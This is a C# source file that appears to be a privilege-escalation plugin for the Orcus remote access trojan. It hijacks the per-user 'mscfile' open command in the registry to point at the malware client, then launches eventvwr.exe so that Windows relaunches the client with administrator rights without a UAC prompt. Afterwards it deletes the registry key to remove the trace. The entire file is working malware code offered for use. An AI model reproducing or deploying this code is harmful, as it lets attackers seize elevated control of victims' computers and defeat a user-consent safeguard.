using System.Diagnostics;
using Microsoft.Win32;
using Orcus.Plugins;

namespace Orcus.UAC
{
public class Plugin : ClientController
{
	public override bool InfluenceStartup(IClientStartup clientStartup)
	{
		if (!clientStartup.IsAdministrator)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Classes\\mscfile\\shell\\open\\command").SetValue("", clientStartup.ClientPath);
			Process process = new Process
			{
				StartInfo =
				{
					FileName = "eventvwr.exe"
				}
			};
			if (process.Start())
			{
				return false;
			}
		}
		Dispose();
		return true;
	}

	private void Dispose()
	{
		Registry.CurrentUser.DeleteSubKey("Software\\Classes\\mscfile\\shell\\open\\command");
	}
}
}
